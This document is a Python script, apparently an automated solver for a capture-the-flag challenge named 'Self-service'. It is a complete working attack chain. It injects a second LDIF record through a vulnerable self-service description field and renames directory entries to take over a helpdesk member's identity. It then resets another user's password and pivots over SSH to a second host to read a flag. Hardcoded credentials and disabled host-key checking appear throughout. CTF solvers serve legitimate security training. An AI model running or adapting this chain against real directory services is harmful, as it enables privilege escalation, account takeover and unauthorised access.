#!/usr/bin/env python3
"""
Automated solver for the NNSC.TF "Self-service" LDAP/LDIF injection challenge.

Usage:
    python3 solve_self_service.py self-service-bfc0455f0bb8.chall.nnsc.tf

Dependencies:
    pip install pexpect

The solver:
  1. SSHes to the challenge through the TLS ProxyCommand.
  2. Finds the current DN and a helpdesk member.
  3. Uses the vulnerable Set-MyDirectoryAttribute function to inject LDIF.
  4. Moves ereid from contractors -> staff.
  5. Renames the selected helpdesk member (e.g. cnovak) to a vacant UID.
  6. Renames ereid -> that original privileged UID, inheriting the stale helpdesk
     membership caused by the challenge's DN/RDN bug.
  7. Resets ops' password via LDAP.
  8. SSHes from the challenge host to srv2 and prints flag.txt.
"""

import argparse
import base64
import re
import sys
import time

import pexpect


DEFAULT_USER = "ereid"
DEFAULT_PASSWORD = "Summer2026"
DEFAULT_PORT = 1337
DEFAULT_SRV2 = "srv2"
BASE_DN = "dc=corp,dc=nns"
STAFF_OU = "ou=staff," + BASE_DN
CONTRACTOR_OU = "ou=contractors," + BASE_DN
HELPDESK_DN = "cn=helpdesk,ou=groups," + BASE_DN
OPS_DN = f"uid=ops,{STAFF_OU}"


class SolverError(RuntimeError):
    pass


class SelfServiceSolver:
    def __init__(self, host: str, user: str, password: str, port: int, srv2: str):
        self.host = host
        self.user = user
        self.password = password
        self.port = port
        self.srv2 = srv2
        self.child = None

    def log(self, msg: str):
        print(f"[+] {msg}", flush=True)

    def fail(self, msg: str):
        raise SolverError(msg)

    def connect(self):
        ssh_cmd = (
            f"ssh -tt "
            f"-o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null "
            f"-o ConnectTimeout=12 "
            f"-o 'ProxyCommand=openssl s_client -quiet -connect %h:%p' "
            f"{self.user}@{self.host} -p {self.port}"
        )

        self.log(f"Connecting to {self.host}:{self.port} as {self.user}...")
        self.child = pexpect.spawn(
            "/bin/bash",
            ["-lc", ssh_cmd],
            encoding="utf-8",
            timeout=20,
        )

        while True:
            idx = self.child.expect(
                [
                    r"(?i)password:",
                    r"Are you sure you want to continue connecting \(yes/no(?:/\[fingerprint\])?\)\?",
                    r"Permission denied",
                    pexpect.EOF,
                    pexpect.TIMEOUT,
                ]
            )
            if idx == 0:
                self.child.sendline(self.password)
                break
            if idx == 1:
                self.child.sendline("yes")
                continue
            if idx == 2:
                self.fail("Initial SSH authentication failed.")
            if idx == 3:
                self.fail("SSH exited before authentication.")
            if idx == 4:
                self.fail("Timed out waiting for the challenge SSH login.")

        # Drain login output and establish a deterministic command marker.
        self._raw_command("printf '\\n__SS_READY__\\n'", marker="__SS_READY__")
        self.log("Remote PowerShell session ready.")

    def _raw_command(self, command: str, marker: str, timeout: int = 20) -> str:
        if not self.child:
            self.fail("Not connected.")

        self.child.sendline(command)
        old_timeout = self.child.timeout
        self.child.timeout = timeout
        try:
            self.child.expect(re.escape(marker))
            out = self.child.before
            return out
        except pexpect.TIMEOUT as exc:
            raise SolverError(f"Timed out waiting for marker {marker!r}.") from exc
        finally:
            self.child.timeout = old_timeout

    @staticmethod
    def _ps_b64(script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def ps(self, script: str, timeout: int = 25) -> str:
        """
        Execute arbitrary PowerShell in the already-loaded session.

        Base64 + Invoke-Expression is used only to avoid quoting/newline problems
        when injecting multiline LDIF through Set-MyDirectoryAttribute.
        """
        token = f"__PS_DONE_{int(time.time() * 1000000)}__"
        b64 = self._ps_b64(script)
        command = (
            "$__ss_s=[Text.Encoding]::Unicode.GetString("
            f"[Convert]::FromBase64String('{b64}')); "
            "$__ss_o=Invoke-Expression $__ss_s 2>&1 | Out-String; "
            "Write-Output '__PS_BEGIN__'; "
            "Write-Output $__ss_o; "
            f"Write-Output '{token}';"
        )
        return self._raw_command(command, token, timeout=timeout)

    @staticmethod
    def extract_dn(output: str) -> str:
        m = re.search(r"(?m)^dn:\s*(.+?)\s*$", output)
        if not m:
            raise SolverError(f"Could not extract DN from ldapsearch output:\n{output}")
        return m.group(1).strip()

    @staticmethod
    def extract_helpdesk_uid(output: str) -> str:
        # Prefer member: uid=... entries in the helpdesk group.
        uids = re.findall(
            r"(?mi)^member:\s*uid=([^,\s]+),ou=staff,dc=corp,dc=nns\s*$",
            output,
        )
        if not uids:
            # Fallback for servers exposing only uid/dn in the search output.
            uids = re.findall(
                r"(?mi)^uid:\s*([^\r\n]+)$",
                output,
            )
        if not uids:
            raise SolverError(f"Could not find a helpdesk member:\n{output}")
        return uids[0].strip()

    @staticmethod
    def make_injected_ldif(extra_record: str, value: str = "SS-INJECT") -> str:
        """
        The vulnerable function generates:

            dn: self
            changetype: modify
            replace: description
            description: <VALUE>

        Putting a blank line + a second LDIF record in VALUE creates a second
        top-level LDAP operation.
        """
        return value + "\n\n" + extra_record

    def set_description_with_injection(self, extra_record: str, timeout: int = 25) -> str:
        payload = self.make_injected_ldif(extra_record)
        ps = r"""
$payload = @'
""" + payload + r"""
'@
Set-MyDirectoryAttribute -Name description -Value $payload
"""
        return self.ps(ps, timeout=timeout)

    def ldap(self, ldif: str, bind_dn: str, password: str, timeout: int = 25) -> str:
        b64 = base64.b64encode(ldif.encode("utf-8")).decode("ascii")
        ps = (
            "$b=[Text.Encoding]::UTF8.GetString("
            f"[Convert]::FromBase64String('{b64}')); "
            "$b | ldapmodify -x -H ldap://dir:3389 "
            f"-D '{bind_dn}' -w '{password}' 2>&1 | Out-String"
        )
        return self.ps(ps, timeout=timeout)

    def solve(self):
        self.connect()

        self.log("Enumerating the current LDAP identity...")
        out = self.ps(
            "ldapsearch -x -LLL -H ldap://dir:3389 "
            f"-b '{BASE_DN}' '(uid=' + $env:USER + ')' dn memberOf 2>&1 | Out-String"
        )
        current_dn = self.extract_dn(out)
        self.log(f"Current DN: {current_dn}")

        if not current_dn.lower().endswith("," + CONTRACTOR_OU.lower()):
            self.log("Account is not currently under ou=contractors; continuing anyway.")

        self.log("Finding a real helpdesk member...")
        out = self.ps(
            "ldapsearch -x -LLL -H ldap://dir:3389 "
            f"-b '{HELPDESK_DN}' member 2>&1 | Out-String"
        )
        privileged_uid = self.extract_helpdesk_uid(out)
        self.log(f"Selected helpdesk identity: {privileged_uid}")

        # 1) Contractor -> staff. We deliberately use the vulnerable helper,
        #    whose LDAP bind is the current user's DN and therefore inherits
        #    onboarding-agent moddn.
        new_self_dn = f"uid={self.user},{STAFF_OU}"
        move_record = (
            f"dn: {current_dn}\n"
            "changetype: modrdn\n"
            f"newrdn: uid={self.user}\n"
            "deleteoldrdn: 1\n"
            f"newsuperior: {STAFF_OU}"
        )
        self.log("Abusing onboarding-agent moddn to move ereid -> staff...")
        out = self.set_description_with_injection(move_record)
        if "modifying entry" not in out.lower() and "result: 0 success" not in out.lower():
            self.log("moddn output did not contain the usual success text; verifying.")
        verify = self.ps(
            "ldapsearch -x -LLL -H ldap://dir:3389 "
            f"-b '{new_self_dn}' '(objectClass=*)' dn memberOf 2>&1 | Out-String"
        )
        if new_self_dn.lower() not in verify.lower():
            self.fail(f"Could not verify move to staff:\n{verify}")
        self.log(f"Moved to: {new_self_dn}")

        # 2) Free the privileged UID while intentionally leaving its helpdesk
        #    membership reference stale.
        vacant_uid = f"vacant_{int(time.time())}"
        old_priv_dn = f"uid={privileged_uid},{STAFF_OU}"
        vacant_dn = f"uid={vacant_uid},{STAFF_OU}"
        free_record = (
            f"dn: {old_priv_dn}\n"
            "changetype: modrdn\n"
            f"newrdn: uid={vacant_uid}\n"
            "deleteoldrdn: 1"
        )
        self.log(
            f"Renaming {privileged_uid} -> {vacant_uid} to preserve the stale helpdesk membership..."
        )
        out = self.set_description_with_injection(free_record)
        verify = self.ps(
            "ldapsearch -x -LLL -H ldap://dir:3389 "
            f"-b '{vacant_dn}' '(objectClass=*)' dn memberOf 2>&1 | Out-String"
        )
        if "helpdesk" not in verify.lower():
            self.log("Warning: helpdesk membership was not visible on the renamed entry.")
            self.log(verify.strip())
        else:
            self.log("Stale helpdesk membership confirmed on the renamed account.")

        # 3) Take the now-free privileged UID.
        final_dn = f"uid={privileged_uid},{STAFF_OU}"
        take_record = (
            f"dn: {new_self_dn}\n"
            "changetype: modrdn\n"
            f"newrdn: uid={privileged_uid}\n"
            "deleteoldrdn: 1"
        )
        self.log(f"Renaming {self.user} -> {privileged_uid}...")
        out = self.set_description_with_injection(take_record)

        verify = self.ps(
            "ldapsearch -x -LLL -H ldap://dir:3389 "
            f"-b '{final_dn}' '(objectClass=*)' dn memberOf 2>&1 | Out-String"
        )
        if "helpdesk" not in verify.lower():
            self.fail(f"Privileged membership was not obtained:\n{verify}")
        self.log(f"Helpdesk identity acquired: {final_dn}")

        # 4) Use the newly acquired helpdesk write ACL to reset ops.
        new_password = "NNS-temp-2026!"
        reset_ldif = (
            f"dn: {OPS_DN}\n"
            "changetype: modify\n"
            "replace: userPassword\n"
            f"userPassword: {new_password}\n"
        )
        self.log("Resetting ops password...")
        out = self.ldap(reset_ldif, final_dn, self.password)
        if "modifying entry" not in out.lower() and "result: 0 success" not in out.lower():
            # Verify instead of trusting client output.
            self.log("LDAP reset output was unusual; continuing to SSH verification.")
        self.log("ops password reset attempted.")

        # 5) Nested SSH from inside the challenge environment.
        self.log(f"Pivoting from the challenge host to {self.srv2} as ops...")
        nested = (
            f"ssh -tt -o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null {self.srv2_user()}@{self.srv2}"
        )
        self.child.sendline(nested)

        idx = self.child.expect(
            [
                r"(?i)password:",
                r"Are you sure you want to continue connecting \(yes/no(?:/\[fingerprint\])?\)\?",
                r"Permission denied",
                pexpect.EOF,
                pexpect.TIMEOUT,
            ],
            timeout=20,
        )
        if idx == 1:
            self.child.sendline(new_password)
            self.child.expect(r"(?i)password:", timeout=10)
            self.child.sendline(new_password)
        elif idx == 0:
            self.child.sendline(new_password)
        elif idx == 2:
            self.fail("Nested SSH reported Permission denied.")
        elif idx == 3:
            self.fail("Nested SSH exited unexpectedly.")
        else:
            self.fail("Timed out waiting for nested SSH.")

        flag = self._raw_command(
            "cat ~/flag.txt 2>&1; printf '\\n__FLAG_DONE__\\n'",
            marker="__FLAG_DONE__",
            timeout=20,
        )

        # Pull a flag-shaped string; fall back to printing the captured tail.
        m = re.search(r"NNS\{[^}\r\n]+\}", flag)
        if m:
            print("\nFLAG:", m.group(0), "\n")
        else:
            print("\n[!] Flag-shaped text was not detected. Captured output:")
            print(flag.strip())

    def srv2_user(self):
        return "ops"

    def close(self):
        if self.child is not None:
            try:
                self.child.sendline("exit")
                time.sleep(0.3)
            except Exception:
                pass
            try:
                self.child.close(force=True)
            except Exception:
                pass


def main():
    parser = argparse.ArgumentParser(description="Automated NNSC.TF self-service solver")
    parser.add_argument("host", nargs="?", default="self-service-bfc0455f0bb8.chall.nnsc.tf")
    parser.add_argument("--user", default=DEFAULT_USER)
    parser.add_argument("--password", default=DEFAULT_PASSWORD)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--srv2", default=DEFAULT_SRV2)
    args = parser.parse_args()

    solver = SelfServiceSolver(
        host=args.host,
        user=args.user,
        password=args.password,
        port=args.port,
        srv2=args.srv2,
    )
    try:
        solver.solve()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", file=sys.stderr)
        sys.exit(130)
    except Exception as exc:
        print(f"\n[!] Solver failed: {exc}", file=sys.stderr)
        sys.exit(1)
    finally:
        solver.close()


if __name__ == "__main__":
    main()
